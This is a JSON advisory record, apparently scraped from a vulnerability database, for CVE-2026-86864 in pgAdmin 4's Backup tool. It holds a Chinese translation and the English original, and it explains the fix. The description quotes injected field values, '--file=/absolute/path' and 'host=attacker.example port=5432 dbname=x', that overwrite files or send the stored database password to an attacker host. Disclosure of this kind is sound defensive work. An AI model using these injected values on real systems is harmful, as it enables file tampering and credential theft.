@@ -1,0 +1,129 @@
+{
+  "saved_at": "2026-09-17T17:29:17+00:00",
+  "first_seen": true,
+  "translated": true,
+  "source_list": "https://www.oscs1024.com/oscs/v1/vdb/vuln_info",
+  "source_page": "https://www.oscs1024.com/hd/MPS-hk6w-evbl",
+  "detail": {
+    "analysis_status": 0,
+    "articles": [],
+    "cnvd_id": "",
+    "cve_id": "CVE-2026-86864",
+    "cvss": {
+      "cvssv31": [
+        {
+          "source": "f86ef6dc-4d3a-42ad-8f28-e6d5547a5007",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "severity": "high",
+          "base_score": 8.8
+        }
+      ],
+      "cvssv4": [
+        {
+          "source": "f86ef6dc-4d3a-42ad-8f28-e6d5547a5007",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+          "severity": "high",
+          "base_score": 8.7
+        }
+      ]
+    },
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+    "cwe": "CWE-88",
+    "description": "pgAdmin 4 的备份工具将 /backup/job/<sid>/object 请求中客户端提供的“数据库”字段作为裸尾位置参数附加到 pg_dump 参数向量，而无需进行验证。因为 pg_dump 使用 getopt_long 解析其选项，它会排列参数，所以以破折号开头的值被解释为选项而不是数据库名称。因此，像 --file=/absolute/path 这样的值会覆盖 pgAdmin 之前构建的存储受限的 --file，导致 pg_dump 将其输出写入 pgAdmin 进程可以写入的任何位置，即用户的文件管理器存储目录之外。当运行 pgAdmin 的操作系统帐户时，这会产生任意文件创建和覆盖，这可能会破坏 pgAdmin 自己的配置数据库，并且根据所选目标，进一步升级。\n\n同一字段还允许连接字符串注入。 libpq 将包含等号的数据库名称扩展为完整的连接字符串，其中嵌入的关键字会覆盖 pgAdmin 传递的 --host 和 --port ，因此诸如“host=attacker.example port=5432 dbname=x”之类的值将 pg_dump 重定向到攻击者选择的服务器。由于 pgAdmin 在执行该实用程序之前会导出 PGPASSWORD 环境变量中已解密的存储数据库密码，因此重定向的连接会将该凭据携带到攻击者指定的端点。任何持有 tools_backup 权限（授予默认用户角色）的经过身份验证的用户都可以访问这两种行为。\n\n该修复完全停止通过参数向量传递数据库名称，并将其提供在 PGDATABASE 环境变量中，libpq 将其视为文字数据库名称，并且从不扩展为连接字符串。这与导入/导出工具已使用的方法相匹配。回归测试断言构造的参数向量中不存在数据库名称，并且 PGDATABASE 携带准确的请求值。\n\n此问题影响 pgAdmin 4：源自 9.18 之前的备份工具中引入的尾随位置数据库参数。",
+    "effects": [],
+    "epss": -1,
+    "exp": false,
+    "exploit_requirement": "",
+    "exploit_requirement_cost": "低",
+    "exploitability": "中",
+    "fix_suggestion": "建议修复",
+    "kind": "参数注入或修改",
+    "kind_en": "命令中参数分隔符的不正确中和（“参数注入”）",
+    "last_modified_time": "2026-09-18",
+    "level": "High",
+    "mps_id": "MPS-hk6w-evbl",
+    "poc": false,
+    "poc_url": [],
+    "published_time": "2026-09-18",
+    "reference_url_list": [
+      {
+        "url": "https://www.oscs1024.com/hd/MPS-hk6w-evbl",
+        "name": "https://www.oscs1024.com/hd/MPS-hk6w-evbl"
+      },
+      {
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86864",
+        "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86864"
+      },
+      {
+        "url": "https://github.com/pgadmin-org/pgadmin4/issues/10384",
+        "name": ""
+      }
+    ],
+    "scope_influence": "",
+    "tags": [],
+    "title": "CVE-2026-86864漏洞",
+    "_translated": true
+  },
+  "detail_original": {
+    "analysis_status": 0,
+    "articles": [],
+    "cnvd_id": "",
+    "cve_id": "CVE-2026-86864",
+    "cvss": {
+      "cvssv31": [
+        {
+          "source": "f86ef6dc-4d3a-42ad-8f28-e6d5547a5007",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "severity": "high",
+          "base_score": 8.8
+        }
+      ],
+      "cvssv4": [
+        {
+          "source": "f86ef6dc-4d3a-42ad-8f28-e6d5547a5007",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+          "severity": "high",
+          "base_score": 8.7
+        }
+      ]
+    },
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+    "cwe": "CWE-88",
+    "description": "pgAdmin 4's Backup tool appended the client-supplied 'database' field from the /backup/job/<sid>/object request to the pg_dump argument vector as a bare trailing positional argument, without validation. Because pg_dump parses its options with getopt_long, which permutes arguments, a value beginning with a dash was interpreted as an option rather than as a database name. A value such as --file=/absolute/path therefore overrode the storage-confined --file that pgAdmin had constructed earlier, causing pg_dump to write its output anywhere the pgAdmin process could write, outside the user's File Manager storage directory. This yields arbitrary file creation and overwrite as the operating-system account running pgAdmin, which can destroy pgAdmin's own configuration database and, depending on the target chosen, be escalated further.\n\nThe same field additionally permitted connection-string injection. libpq expands a database name containing an equals sign into a full connection string, and keywords embedded there override the --host and --port that pgAdmin passes, so a value such as 'host=attacker.example port=5432 dbname=x' redirected pg_dump to a server of the attacker's choosing. Because pgAdmin exports the decrypted stored database password in the PGPASSWORD environment variable before executing the utility, the redirected connection carries that credential to the attacker-nominated endpoint. Both behaviours are reachable by any authenticated user holding the tools_backup permission, which is granted to the default User role.\n\nThe fix stops passing the database name through the argument vector altogether and supplies it in the PGDATABASE environment variable, which libpq treats as a literal database name and never expands as a connection string. This matches the approach already used by the Import/Export tool. Regression tests assert that the database name is absent from the constructed argument vector and that PGDATABASE carries the exact requested value.\n\nThis issue affects pgAdmin 4: from the introduction of the trailing positional database argument in the Backup tool before 9.18.",
+    "effects": [],
+    "epss": -1,
+    "exp": false,
+    "exploit_requirement": "",
+    "exploit_requirement_cost": "低",
+    "exploitability": "中",
+    "fix_suggestion": "Recommend",
+    "kind": "参数注入或修改",
+    "kind_en": "Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')",
+    "last_modified_time": "2026-09-18",
+    "level": "High",
+    "mps_id": "MPS-hk6w-evbl",
+    "poc": false,
+    "poc_url": [],
+    "published_time": "2026-09-18",
+    "reference_url_list": [
+      {
+        "url": "https://www.oscs1024.com/hd/MPS-hk6w-evbl",
+        "name": "https://www.oscs1024.com/hd/MPS-hk6w-evbl"
+      },
+      {
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86864",
+        "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86864"
+      },
+      {
+        "url": "https://github.com/pgadmin-org/pgadmin4/issues/10384",
+        "name": ""
+      }
+    ],
+    "scope_influence": "",
+    "tags": [],
+    "title": "CVE-2026-86864漏洞"
+  },
+  "first_saved_at": "2026-09-17T17:29:17+00:00"
+}
